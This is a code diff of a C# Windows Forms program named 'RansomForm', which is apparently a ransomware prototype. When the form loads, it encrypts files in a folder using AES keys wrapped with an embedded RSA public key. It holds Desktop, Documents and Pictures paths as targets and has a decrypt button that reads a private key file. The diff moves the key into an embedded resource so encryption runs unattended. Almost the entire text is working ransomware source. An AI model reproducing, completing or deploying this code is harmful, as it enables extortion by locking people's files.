@@ -1,12 +1,12 @@
 using System.Security.Cryptography;
-
+using System.IO;
+using System.Reflection;
+using System.Text;
 
 namespace RansomForm
 {
   public partial class Form1 : Form
   {
-    //private string publicKey = "<RSAKeyValue><Modulus>zVv2ITIhGtW1h3racpYs87k2qH01zOHC8Lf7ZTZMlETHyJc8mnxWTttPKKcoMXP18+3AEmMD6sHZfj3PjskIOrR2DQ6DBpNuyiZHUCvrgeA8XJmHR2IETtdugeQ6afBUqi6Au7RMMDFh9rcvsszhNxFsLz7lzgHvU6+VwJS04Ok=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
-
     private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
     private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
     private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
@@ -22,34 +22,26 @@ namespace RansomForm
     private byte[] rsaprivatekey;
     private byte[] rsapublickey;
 
-
-    public Form1()
+		public Form1()
     {
       InitializeComponent();
     }
 
-
     private void Form1_Load(object sender, EventArgs e)
     {
-      beginEncryption();
+			beginEncryption();
       formatFormPostEncryption();
     }
 
     private void beginEncryption()
     {
-      using (FileStream fileStream = new("publickey.txt", FileMode.Open))
-      {
-        rsapublickey = new byte[fileStream.Length];
-        fileStream.Read(rsapublickey, 0, rsapublickey.Length);
-      }
-      // Have pkey in variable.
-      string folderpath = Directory.GetCurrentDirectory() + "\\test";
+			rsapublickey = Properties.Resources.publickey;
+			string folderpath = Directory.GetCurrentDirectory() + "\\test";
       encryptFolder(folderpath);
       
     }
 
-
-    private void encryptFolder(string path)
+		private void encryptFolder(string path)
     {
       RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
       int bytesRead;
@@ -84,7 +76,6 @@ namespace RansomForm
 
             aes.Padding = PaddingMode.PKCS7;
 
-            // What we are going to encrypt and write into file.
             iv = aes.IV;
             keyvalue = aes.Key;
 
@@ -110,7 +101,6 @@ namespace RansomForm
                   read = fileStream.Read(buffer, 0, buffer.Length);
                 }
                 cryptoStream.FlushFinalBlock();
-
               }
             }
           }
@@ -138,7 +128,7 @@ namespace RansomForm
     private void buttonDecrypt_Click(object sender, EventArgs e) // 5
     {
       string folderpath = Directory.GetCurrentDirectory() + "\\test";
-      using (FileStream fileStream = new("privatekey.txt", FileMode.Open))
+      using (FileStream fileStream = new("privatekey.pem", FileMode.Open))
       {
         rsaprivatekey = new byte[fileStream.Length];
         fileStream.Read(rsaprivatekey, 0, rsaprivatekey.Length);
